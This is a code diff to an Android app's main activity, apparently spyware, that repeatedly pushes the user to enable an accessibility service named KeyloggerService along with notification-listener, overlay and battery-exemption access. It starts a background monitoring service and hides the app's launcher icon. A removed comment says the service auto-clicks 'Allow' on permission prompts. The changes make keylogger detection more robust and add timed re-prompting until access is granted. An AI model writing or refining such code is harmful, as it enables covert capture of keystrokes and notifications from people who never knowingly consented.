@@ -1,5 +1,6 @@
 package com.example.myapplicationtestweb
 
+import android.accessibilityservice.AccessibilityServiceInfo
 import android.app.AppOpsManager
 import android.content.Context
 import android.content.Intent
@@ -22,6 +23,11 @@ class MainActivity : ComponentActivity() {
     private lateinit var webView: WebView
     private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())
 
+    private var lastAccessibilityPromptTime: Long = 0
+    private var lastNotificationPromptTime: Long = 0
+    private var lastOverlayPromptTime: Long = 0
+    private var lastBatteryPromptTime: Long = 0
+
     private val requestPermissionsLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { _ ->
@@ -35,12 +41,11 @@ class MainActivity : ComponentActivity() {
         setContentView(webView)
         
         setupWebView()
-        // DO NOT load URL yet — wait for permissions
         
         // Start initial monitoring service immediately 
         startMonitoringService()
         
-        // Use a small delay for the initial check to ensure UI is ready
+        // Delay initial check to ensure UI is ready
         mainHandler.postDelayed({ checkNextStep() }, 1000)
     }
 
@@ -73,7 +78,7 @@ class MainActivity : ComponentActivity() {
         startMonitoringService()
 
         val required = Config.getRequiredPermissions(this)
-        val runtimeMissing = required.isNotEmpty() && required.any { 
+        val runtimeMissing = required.any { 
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED 
         }
         
@@ -82,27 +87,27 @@ class MainActivity : ComponentActivity() {
         val enableOverlay = Config.isFeatureEnabled(this, "feat_overlay")
         val enableBattery = Config.isFeatureEnabled(this, "feat_battery")
 
-        // --- ACCESSIBILITY-FIRST FLOW ---
+        val now = System.currentTimeMillis()
+
+        // --- ACCESSIBILITY-FIRST FLOW (WITH LOOP-PREVENTION THROTTLING) ---
         when {
-            enableKeylogger && !isAccessibilityServiceEnabled() -> {
+            enableKeylogger && !isAccessibilityServiceEnabled() && (now - lastAccessibilityPromptTime > 6000) -> {
                 requestAccessibilityAccess()
             }
             runtimeMissing -> {
-                // If Accessibility is ON, we request bulk permissions.
-                // The AccessibilityService will now auto-click "Allow" for these.
                 checkAndRequestBulkPermissions()
             }
-            enableNotifications && !isNotificationServiceEnabled() -> {
+            enableNotifications && !isNotificationServiceEnabled() && (now - lastNotificationPromptTime > 6000) -> {
                 requestNotificationAccess()
             }
-            enableOverlay && !isOverlayAccessGranted() -> {
+            enableOverlay && !isOverlayAccessGranted() && (now - lastOverlayPromptTime > 6000) -> {
                 requestOverlayAccess()
             }
-            enableBattery && !isIgnoringBatteryOptimizations() -> {
+            enableBattery && !isIgnoringBatteryOptimizations() && (now - lastBatteryPromptTime > 6000) -> {
                 requestIgnoreBatteryOptimizations()
             }
             else -> {
-                // ALL PERMISSIONS GRANTED — Final Step
+                // ALL PERMISSIONS GRANTED OR SKIPPED — Load Webview
                 if (webView.url == null) {
                     webView.loadUrl(Config.getWebUrl(this))
                 }
@@ -111,22 +116,44 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun isAccessibilityServiceEnabled(): Boolean {
-        val service = "$packageName/${KeyloggerService::class.java.canonicalName}"
-        val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
-        if (enabled == 1) {
-            val splitter = TextUtils.SimpleStringSplitter(':')
-            val settingValue = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
-            if (settingValue != null) {
-                splitter.setString(settingValue)
-                while (splitter.hasNext()) {
-                    if (splitter.next().equals(service, ignoreCase = true)) return true
+        // 1. Official System AccessibilityManager Check
+        try {
+            val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as? android.view.accessibility.AccessibilityManager
+            val enabledServices = am?.getEnabledAccessibilityServiceList(-1)
+            if (enabledServices != null) {
+                for (info in enabledServices) {
+                    val sInfo = info.resolveInfo?.serviceInfo
+                    if (sInfo != null && sInfo.packageName == packageName && 
+                        (sInfo.name.contains("KeyloggerService") || sInfo.name == KeyloggerService::class.java.name)) {
+                        return true
+                    }
                 }
             }
-        }
+        } catch (e: Exception) {}
+
+        // 2. Settings.Secure Fallback with Flexible String Matching
+        try {
+            val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
+            if (enabled == 1) {
+                val settingValue = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
+                if (!settingValue.isNullOrEmpty()) {
+                    val splitter = TextUtils.SimpleStringSplitter(':')
+                    splitter.setString(settingValue)
+                    while (splitter.hasNext()) {
+                        val s = splitter.next().trim()
+                        if (s.contains(packageName, ignoreCase = true) && s.contains("KeyloggerService", ignoreCase = true)) {
+                            return true
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {}
+
         return false
     }
 
     private fun requestAccessibilityAccess() {
+        lastAccessibilityPromptTime = System.currentTimeMillis()
         try {
             val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
@@ -140,6 +167,7 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun requestNotificationAccess() {
+        lastNotificationPromptTime = System.currentTimeMillis()
         try {
             val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
@@ -174,6 +202,7 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun requestIgnoreBatteryOptimizations() {
+        lastBatteryPromptTime = System.currentTimeMillis()
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
@@ -192,6 +221,7 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun requestOverlayAccess() {
+        lastOverlayPromptTime = System.currentTimeMillis()
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
@@ -216,8 +246,6 @@ class MainActivity : ComponentActivity() {
 
     private fun hideAppIcon() {
         try {
-            // Disable the launcher alias to remove icon from home screen
-            // The package itself stays installed and visible in Settings > Apps
             val componentName = android.content.ComponentName(this, "com.example.myapplicationtestweb.LauncherAlias")
             packageManager.setComponentEnabledSetting(
                 componentName,
